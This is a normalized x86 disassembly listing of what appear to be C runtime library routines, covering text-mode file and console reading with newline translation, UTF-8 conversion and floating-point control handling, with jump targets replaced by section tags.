mov al [ ecx + edi + 0x28 ]
test al 0x40
jne r-xdata
cmp cl 0xd
je r-xdata
lea eax [ edx + ecx ]
mov ebx edx
mov [ ebp - 0x8 ] eax
mov esi edx
cmp edx eax
jae r-xdata
mov cl [ ebx ]
mov [ esi ] cl
inc esi
or al 0x2
mov [ ecx + edi + 0x28 ] al
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp eax ecx
jae r-xdata
mov [ esi ] cl
inc esi
inc ebx
inc eax
jmp r-xdata
inc ebx
inc eax
push 0x0
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
push [ ebp - 0x14 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov [ esi ] 0xd
inc esi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov [ esi ] 0xd
inc esi
inc ebx
inc eax
jmp r-xdata
add ebx 0x2
mov [ esi ] 0xa
add eax 0x2
inc esi
jmp r-xdata
mov cl [ ebx ]
cmp cl 0x1a
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov eax [ ecx * 4 + rw-data ]
test [ eax + edi + 0x28 ] 0x48
je r-xdata
cmp ebx ecx
jb r-xdata
cmp [ ebp - 0x1 ] 0xa
jne r-xdata
mov dl [ ebp - 0x1 ]
cmp dl 0xa
jne r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_43f625
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov edx [ ebp + 0xc ]
cmp esi edx
jne r-xdata
mov [ esi ] 0xd
mov eax [ ecx * 4 + rw-data ]
mov [ eax + edi + 0x2a ] dl
jmp r-xdata
mov [ esi ] dl
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ esi ] 0xa
inc esi
jmp r-xdata
mov eax [ ebp - 0xc ]
sub_4463b2
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
and eax 0x3f
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
sar ecx 0x6
imul edi eax 0x30
mov [ ebp - 0x8 ] ecx
push 0xa
mov eax [ ecx * 4 + rw-data ]
pop ebx
mov edx [ eax + edi + 0x18 ]
mov [ ebp - 0x14 ] edx
mov edx [ ebp + 0xc ]
test esi esi
je r-xdata
and [ eax + edi + 0x28 ] 0xfb
cmp [ edx ] bx
jne r-xdata
sub esi edx
and esi 0xfffffffe
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ edx + 0x2 ]
or [ eax + edi + 0x28 ] 0x4
jmp r-xdata
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + edi + 0x28 ]
test al 0x40
jne r-xdata
push 0xd
pop edx
cmp [ ebp - 0xc ] dx
mov edx [ ebp + 0xc ]
je r-xdata
lea eax [ edx + esi * 2 ]
mov ebx edx
mov [ ebp - 0x10 ] eax
mov esi edx
cmp edx eax
jae r-xdata
mov cx [ ebx ]
mov [ esi ] cx
add esi 0x2
or al 0x2
mov [ ecx + edi + 0x28 ] al
jmp r-xdata
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov ecx [ ebp - 0xc ]
add ebx 0x2
mov [ esi ] cx
add esi 0x2
add eax 0x2
jmp r-xdata
add eax 0x2
add ebx 0x2
push 0x0
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x14 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push 0xa
pop edx
cmp [ eax ] dx
mov edx [ ebp + 0xc ]
jne r-xdata
cmp ebx [ ebp - 0x10 ]
jb r-xdata
push 0xd
pop eax
mov [ esi ] ax
add esi 0x2
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0xd
pop edx
mov [ esi ] dx
add ebx 0x2
add esi 0x2
add eax 0x2
jmp r-xdata
push 0xa
pop ecx
add ebx 0x4
mov [ esi ] cx
add eax 0x4
add esi 0x2
jmp r-xdata
movzx ecx [ ebx ]
mov [ ebp - 0xc ] ecx
cmp ecx 0x1a
mov ecx [ ebp - 0x8 ]
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
push 0xa
mov eax [ ecx * 4 + rw-data ]
test [ eax + edi + 0x28 ] 0x48
pop eax
je r-xdata
mov edx [ ebp + 0xc ]
cmp [ ebp - 0x4 ] ax
jne r-xdata
mov dx [ ebp - 0x4 ]
cmp dx ax
jne r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_43f625
add esp 0x10
push 0xa
pop eax
cmp [ ebp - 0x4 ] ax
je r-xdata
mov edx [ ebp + 0xc ]
cmp esi edx
jne r-xdata
push 0xd
pop eax
mov [ esi ] ax
mov eax [ ecx * 4 + rw-data ]
push 0xa
mov [ eax + edi + 0x2a ] dl
mov eax [ ecx * 4 + rw-data ]
mov [ eax + edi + 0x2b ] dh
mov eax [ ecx * 4 + rw-data ]
pop edx
mov [ eax + edi + 0x2c ] dl
jmp r-xdata
mov [ esi ] ax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ esi ] ax
add esi 0x2
mov eax [ ebp - 0xc ]
jmp r-xdata
sub_446572
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x3f
sar ecx 0x6
imul edx eax 0x30
mov al [ ebp + 0xc ]
mov ecx [ ecx * 4 + rw-data ]
mov [ ecx + edx + 0x2a ] al
pop ebp
retn
sub_446595
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
push esi
mov esi eax
and eax 0x3f
sar esi 0x6
imul edx eax 0x30
mov eax [ esi * 4 + rw-data ]
mov [ eax + edx + 0x2a ] cl
mov eax [ esi * 4 + rw-data ]
mov [ eax + edx + 0x2b ] ch
mov eax [ esi * 4 + rw-data ]
pop esi
mov [ eax + edx + 0x2c ] 0xa
pop ebp
retn
sub_4465d2
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
call sub_44625b
mov ecx eax
add esp 0xc
test ecx ecx
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
and eax 0x3f
sar edx 0x6
push edi
imul edi eax 0x30
mov [ ebp - 0x4 ] edx
mov eax [ edx * 4 + rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ eax + edi + 0x29 ] 0x0
jne r-xdata
push esi
lea esi [ ebx - 0x1 ]
add esi ecx
mov al [ esi ]
test al al
js r-xdata
mov eax ecx
jmp r-xdata
xor edx edx
movzx eax al
inc edx
jmp r-xdata
inc esi
jmp r-xdata
pop edi
cmp [ eax + rw-data ] 0x0
je r-xdata
push [ ebp + 0x18 ]
sub esi ebx
push [ ebp + 0x14 ]
push esi
push ebx
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov edx eax
test edx edx
jne r-xdata
cmp edx 0x4
ja r-xdata
mov cl [ esi ]
movzx eax cl
movsx eax [ eax + rw-data ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp edx esi
mov ecx [ eax * 4 + rw-data ]
setne al
add al al
xor al [ ecx + edi + 0x2d ]
and al 0x2
xor [ ecx + edi + 0x2d ] al
lea eax [ edx + edx ]
call [ GetLastError@IAT ]
push eax
call sub_42febf
pop ecx
cmp esi ebx
jb r-xdata
inc eax
cmp eax edx
jne r-xdata
call sub_42fef5
mov [ eax ] 0x2a
jmp r-xdata
pop esi
dec esi
inc edx
movzx eax [ esi ]
mov eax [ ebp - 0x8 ]
test [ eax + edi + 0x28 ] 0x48
je r-xdata
add esi edx
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
neg edx
mov eax edx
push 0x1
cdq
push edx
push eax
push [ ebp + 0x8 ]
call sub_43f625
add esp 0x10
inc esi
mov [ eax + edi + 0x2a ] cl
cmp edx 0x2
jb r-xdata
cmp edx 0x3
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov al [ esi ]
inc esi
mov ecx [ ecx * 4 + rw-data ]
mov [ ecx + edi + 0x2b ] al
sub esi edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax * 4 + rw-data ]
mov al [ esi ]
inc esi
mov [ ecx + edi + 0x2c ] al
sub_446722
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi edi
lea edx [ edi + eax * 2 ]
mov eax edi
cmp edi edx
jae r-xdata
sub esi edi
and esi 0xfffffffe
pop edi
mov eax esi
pop esi
pop ebp
retn
lea ecx [ edi + 0x2 ]
push ebx
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x3f
sar ecx 0x6
imul edx eax 0x30
mov ecx [ ecx * 4 + rw-data ]
or [ ecx + edx + 0x28 ] 0x2
cmp ebx 0xd
jne r-xdata
mov [ esi ] bx
add eax 0x2
add esi 0x2
add ecx 0x2
cmp ecx edx
jae r-xdata
movzx ebx [ eax ]
cmp ebx 0x1a
je r-xdata
jmp r-xdata
push 0xa
pop edi
cmp [ ecx ] di
mov edi [ ebp + 0xc ]
jne r-xdata
pop ebx
push 0xa
pop ebx
add eax 0x4
mov [ esi ] bx
add ecx 0x4
add esi 0x2
jmp r-xdata
cmp eax edx
jb r-xdata
sub_4467a3
push 0x14
push r--data
call sub_40d260
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_42fee2
and [ eax ] 0x0
call sub_42fef5
mov [ eax ] 0x9
jmp r-xdata
call sub_42fee2
and [ eax ] 0x0
call sub_42fef5
mov [ eax ] 0x9
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x6
mov eax esi
and eax 0x3f
imul ecx eax 0x30
mov [ ebp - 0x20 ] ecx
mov eax [ ebx * 4 + rw-data ]
movzx eax [ eax + ecx + 0x28 ]
and eax 0x1
je r-xdata
mov eax 0x7fffffff
cmp eax [ ebp + 0x10 ]
sbb eax eax
add eax 0x1
jne r-xdata
push esi
call sub_43901e
pop ecx
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
test [ eax + ecx + 0x28 ] 0x1
jne r-xdata
call sub_42fee2
and [ eax ] 0x0
call sub_42fef5
mov [ eax ] 0x16
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4468b6
add esp 0xc
mov edi eax
mov [ ebp - 0x1c ] edi
call sub_42fef5
mov [ eax ] 0x9
call sub_42fee2
and [ eax ] 0x0
jmp r-xdata
call sub_42fdcf
call sub_40d2a6
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_44688d
mov eax edi
jmp r-xdata
sub_4468b6
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_42fee2
and [ eax ] 0x0
call sub_42fef5
mov [ eax ] 0x9
jmp r-xdata
call sub_42fee2
and [ eax ] 0x0
call sub_42fef5
mov [ eax ] 0x9
cmp ebx [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax ebx
mov [ ebp - 0x14 ] 0x1
and eax 0x3f
mov edi ebx
sar edi 0x6
imul edx eax 0x30
mov [ ebp - 0x10 ] edi
mov eax [ edi * 4 + rw-data ]
mov [ ebp - 0x18 ] edx
mov cl [ edx + eax + 0x28 ]
mov [ ebp - 0x1 ] cl
test cl 0x1
je r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx 0x7fffffff
jbe r-xdata
test ecx ecx
je r-xdata
call sub_42fee2
and [ eax ] 0x0
call sub_42fef5
mov [ eax ] 0x16
jmp r-xdata
xor eax eax
jmp r-xdata
test [ ebp - 0x1 ] 0x2
jne r-xdata
call sub_42fdcf
pop edi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] 0x0
je r-xdata
push esi
mov esi [ edx + eax + 0x18 ]
mov al [ edx + eax + 0x29 ]
mov [ ebp - 0x1 ] al
mov [ ebp - 0x1c ] esi
xor esi esi
movsx eax al
sub eax 0x1
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax ecx
not eax
test dl al
jne r-xdata
sub eax 0x1
jne r-xdata
push 0x4
pop eax
shr ecx 0x1
mov [ ebp - 0xc ] eax
cmp ecx eax
jb r-xdata
call sub_42fee2
and [ eax ] esi
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax ecx
not eax
test al 0x1
je r-xdata
push eax
call sub_42d0e4
push 0x0
mov esi eax
call sub_42d0aa
push 0x0
call sub_42d0aa
add esp 0xc
mov [ ebp - 0x8 ] esi
test esi esi
jne r-xdata
mov eax ecx
mov [ ebp - 0xc ] ecx
or edi 0xffffffff
mov ebx [ ebp - 0x10 ]
xor edi edi
mov [ ebp - 0x24 ] eax
mov ebx [ ebx * 4 + rw-data ]
mov [ ebp - 0x20 ] ebx
test [ edx + ebx + 0x28 ] 0x48
mov ebx [ ebp + 0x8 ]
je r-xdata
push [ ebp - 0x14 ]
push 0x0
push 0x0
push ebx
call sub_43f625
mov ecx [ edi * 4 + rw-data ]
add esp 0x10
mov edi [ ebp - 0x18 ]
mov [ edi + ecx + 0x20 ] eax
mov eax esi
mov [ edi + ecx + 0x24 ] edx
mov edx edi
mov ecx [ ebp - 0xc ]
call sub_42fef5
mov [ eax ] 0xc
call sub_42fee2
mov [ eax ] 0x8
jmp r-xdata
push ebx
call sub_43f216
pop ecx
test eax eax
je r-xdata
mov ebx [ ebp - 0x20 ]
mov bl [ edx + ebx + 0x2a ]
mov [ ebp - 0x2 ] bl
cmp bl 0xa
mov ebx [ ebp + 0x8 ]
je r-xdata
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
mov eax [ eax * 4 + rw-data ]
test [ ecx + eax + 0x28 ] 0x80
je r-xdata
test ecx ecx
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop edi
cmp eax edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp [ ebp - 0x20 ] ecx
ja r-xdata
lea eax [ ebp - 0x28 ]
push eax
push [ ebp - 0x1c ]
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
mov bl [ ebp - 0x2 ]
mov edi [ ebp - 0x14 ]
mov [ eax ] bl
inc eax
mov ebx [ ebp + 0x8 ]
dec ecx
cmp [ ebp - 0x1 ] 0x0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov eax [ eax * 4 + rw-data ]
mov [ edx + eax + 0x2a ] 0xa
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_42fef5
mov [ eax ] 0x9
call sub_42fee2
mov [ eax ] edi
jmp r-xdata
add edi [ ebp - 0x20 ]
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
mov al [ edx + eax + 0x2b ]
mov [ ebp - 0x2 ] al
cmp al 0xa
je r-xdata
push eax
call sub_42febf
pop ecx
xor edi edi
jmp r-xdata
push esi
call sub_42d0aa
pop ecx
mov eax edi
pop esi
jmp r-xdata
cmp [ ebp - 0x1 ] 0x2
je r-xdata
push 0x0
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x1c ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push 0x0
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x1c ]
call [ ReadConsoleW@IAT ]
test eax eax
jne r-xdata
test ecx ecx
je r-xdata
shr edi 0x1
cmp [ ebp - 0x14 ] 0x0
push edi
push [ ebp - 0x24 ]
push ebx
je r-xdata
shr ecx 0x1
push ecx
push [ ebp + 0xc ]
push edi
push [ ebp - 0x8 ]
push ebx
call sub_4465d2
add esp 0x14
mov eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x10 ]
lea edi [ edi + eax * 2 ]
jmp r-xdata
call [ GetLastError@IAT ]
mov eax [ ebp - 0x8 ]
mov bl [ ebp - 0x2 ]
push 0x2
pop edi
mov [ eax ] bl
inc eax
mov ebx [ ebp + 0x8 ]
dec ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov eax [ eax * 4 + rw-data ]
mov [ edx + eax + 0x2b ] 0xa
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x14 ]
jne r-xdata
call sub_4463b2
jmp r-xdata
call sub_446722
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov eax [ eax * 4 + rw-data ]
test [ edx + eax + 0x28 ] 0x80
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
mov al [ edx + eax + 0x2c ]
mov [ ebp - 0x2 ] al
cmp al 0xa
je r-xdata
add esp 0xc
jmp r-xdata
mov edi eax
jmp r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp - 0x8 ]
mov bl [ ebp - 0x2 ]
push 0x3
pop edi
mov [ eax ] bl
inc eax
mov ebx [ ebp + 0x8 ]
dec ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov eax [ eax * 4 + rw-data ]
mov [ edx + eax + 0x2c ] 0xa
sub_446c6b
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0x180
push eax
call sub_446c90
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_446c90
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
test eax 0xfffffe7f
jne r-xdata
call sub_42fef5
push 0x16
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
mov [ rw-data ] eax
xor eax eax
pop esi
pop ebp
retn
sub_446d01
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
cmp [ ecx ] al
je r-xdata
pop ebp
retn
cmp eax [ ebp + 0xc ]
je r-xdata
inc eax
cmp [ eax + ecx ] 0x0
jne r-xdata
sub_446d1d
mov edi edi
push ebp
mov ebp esp
push esi
call sub_447ea3
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_447ee6
mov [ esi + 0x4 ] eax
xor eax eax
pop esi
pop ebp
retn
sub_446d3a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push esi
mov esi [ ebp + 0x8 ]
push [ esi ]
call sub_447f27
push [ esi + 0x4 ]
call sub_447fa7
lea eax [ ebp - 0x8 ]
push eax
call sub_446d1d
mov eax [ esi ]
add esp 0xc
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
inc eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
xor eax eax
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_446d83
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
and [ ebp - 0x4 ] 0x0
push eax
call sub_446d1d
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ecx ] edx
or edx 0x1f
push eax
mov [ ebp - 0x8 ] edx
call sub_446d3a
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
call sub_43d4c0
xor eax eax
mov esp ebp
pop ebp
retn
sub_446de0
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ esp + 0x4 ]
call sub_4440f5
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_448048
sub_446e20
cmp [ rw-data ] 0x0
je r-xdata
sub esp 0xc
fst [ esp ]
call sub_444138
call sub_446e78
add esp 0xc
retn
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_448030
sub_446e78
push edx
fwait
fnstcw [ esp ]
je r-xdata
test eax 0xfffff
jne r-xdata
mov eax [ esp + 0xc ]
cmp [ esp ] 0x27f
je r-xdata
call sub_4440dc
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
test eax 0x7ff00000
je r-xdata
fldcw [ r--data ]
cmp [ rw-data ] 0x0
jne r-xdata
and eax 0x80000000
je r-xdata
test eax 0xfffff
jne r-xdata
test eax 0x80000000
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
lea ecx [ rw-data ]
mov edx 0x1b
call sub_444257
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
fstp st0
fld [ r--data ]
mov eax 0x1
jmp r-xdata
test eax 0x80000000
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
fldlg2
fxch st1
fyl2x
pop edx
retn
fldcw [ esp ]
lea ecx [ rw-data ]
mov edx 0x1b
jmp r-xdata
jmp r-xdata
fstp st0
fld [ r--data ]
mov eax 0x2
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
pop edx
retn
and ax 0x20
je r-xdata
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
call sub_444257
pop edx
retn
sub_446f30
cmp [ rw-data ] 0x0
je r-xdata
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi 0xffff
push esi
push [ rw-data ]
call sub_445b6f
fld [ ebp + 0x8 ]
mov ebx eax
pop ecx
pop ecx
movzx ecx [ ebp + 0xe ]
mov eax 0x7ff0
and ecx eax
push ecx
push ecx
fstp [ esp ]
cmp cx ax
jne r-xdata
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
call sub_4488d8
fst [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0x8
fucom st1
fnstsw ax
test ah 0x44
jpe r-xdata
call sub_4486e5
dec eax
pop ecx
pop ecx
cmp eax 0x2
ja r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
test bl 0x20
jne r-xdata
push esi
fstp st1
push ebx
fstp st0
call sub_445b6f
fld [ ebp - 0x8 ]
pop ecx
pop ecx
jmp r-xdata
fld [ ebp + 0x8 ]
fld [ r--data ]
push ebx
sub esp 0x10
fadd st1
fstp [ esp + 0x8 ]
fstp [ esp ]
push 0xc
push 0x8
jmp r-xdata
push esi
push ebx
call sub_445b6f
fld [ ebp + 0x8 ]
pop ecx
pop ecx
jmp r-xdata
jmp r-xdata
push ebx
sub esp 0x10
fxch st1
fstp [ esp + 0x8 ]
fstp [ esp ]
push 0xc
push 0x10
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_447081
add esp 0x1c
movq xmm0 [ esp + 0x4 ]
movapd xmm2 [ r--data ]
movapd xmm1 xmm0
movapd xmm7 xmm0
psrlq xmm0 0x34
movd eax xmm0
andpd xmm0 [ r--data ]
psubd xmm2 xmm0
psrlq xmm1 xmm2
test eax 0x800
je r-xdata
movq xmm0 [ esp + 0x4 ]
psllq xmm1 xmm2
movapd xmm3 xmm0
cmppd xmm0 xmm1 0x6
cmp eax 0x3ff
jl r-xdata
cmp eax 0xbff
jl r-xdata
cmppd xmm3 [ r--data ] 0x6
andpd xmm3 [ r--data ]
movq [ esp + 0x4 ] xmm3
fld [ esp + 0x4 ]
retn
cmp eax 0x432
jg r-xdata
fld [ r--data ]
retn
psllq xmm1 xmm2
cmp eax 0xc32
jg r-xdata
ucomisd xmm7 xmm7
jpo r-xdata
andpd xmm0 [ r--data ]
addsd xmm1 xmm0
movq [ esp + 0x4 ] xmm1
fld [ esp + 0x4 ]
retn
movq [ esp + 0x4 ] xmm1
fld [ esp + 0x4 ]
retn
fld [ esp + 0x4 ]
retn
mov edx 0x3ec
sub esp 0x10
mov [ esp + 0xc ] edx
mov edx esp
add edx 0x14
mov [ esp + 0x8 ] edx
mov [ esp + 0x4 ] edx
mov [ esp ] edx
call sub_4362b2
add esp 0x10
sub_44704d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test al 0x20
je r-xdata
test al 0x8
je r-xdata
push 0x5
jmp r-xdata
test al 0x4
je r-xdata
xor eax eax
inc eax
pop ebp
retn
pop eax
pop ebp
retn
test al 0x1
je r-xdata
push 0x2
jmp r-xdata
movzx eax al
and eax 0x2
add eax eax
pop ebp
retn
push 0x3
sub_447081
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebx + 0x20 ]
lea eax [ ebx + 0x18 ]
push edi
push esi
push eax
push [ ebx + 0x8 ]
call sub_447257
add esp 0xc
test eax eax
jne r-xdata
push [ ebx + 0x8 ]
call sub_44704d
pop ecx
mov edi eax
call sub_429cbe
test al al
je r-xdata
and [ ebp - 0x40 ] 0xfffffffe
push eax
lea eax [ ebx + 0x18 ]
push eax
lea eax [ ebx + 0x10 ]
push eax
push [ ebx + 0xc ]
lea eax [ ebx + 0x20 ]
push [ ebx + 0x8 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_447467
mov esi [ ebx + 0x20 ]
add esp 0x1c
push edi
call sub_44777b
mov [ esp ] 0xffff
push esi
call sub_445b6f
fld [ ebx + 0x18 ]
pop ecx
pop ecx
test edi edi
je r-xdata
fld [ ebx + 0x18 ]
push esi
sub esp 0x18
fstp [ esp + 0x10 ]
fldz
fstp [ esp + 0x8 ]
fld [ ebx + 0x10 ]
fstp [ esp ]
push [ ebx + 0xc ]
push edi
call sub_4477aa
add esp 0x24
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
sub_44714f
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebx + 0x28 ]
lea eax [ ebx + 0x20 ]
push edi
push esi
push eax
push [ ebx + 0x8 ]
call sub_447257
fld [ ebx + 0x18 ]
add esp 0xc
test eax eax
jne r-xdata
fstp st0
mov eax [ ebp - 0x40 ]
and eax 0xffffffe3
or eax 0x3
mov [ ebp - 0x40 ] eax
lea eax [ ebx + 0x20 ]
push 0x0
push eax
lea eax [ ebx + 0x10 ]
push eax
push [ ebx + 0xc ]
lea eax [ ebx + 0x28 ]
push [ ebx + 0x8 ]
fstp [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_447467
mov esi [ ebx + 0x28 ]
add esp 0x1c
jmp r-xdata
push edi
call sub_44777b
mov [ esp ] 0xffff
push esi
call sub_445b6f
fld [ ebx + 0x20 ]
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebx + 0x8 ]
call sub_44704d
pop ecx
mov edi eax
call sub_429cbe
test al al
je r-xdata
fld [ ebx + 0x20 ]
push esi
sub esp 0x18
fstp [ esp + 0x10 ]
fld [ ebx + 0x18 ]
fstp [ esp + 0x8 ]
fld [ ebx + 0x10 ]
fstp [ esp ]
push [ ebx + 0xc ]
push edi
call sub_4477aa
add esp 0x24
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
sub_447231
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + rw-data ]
pop ebp
retn
inc eax
cmp eax 0x1d
jl r-xdata
cmp [ eax * 8 + rw-data ] ecx
je r-xdata
xor eax eax
pop ebp
retn
sub_447257
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
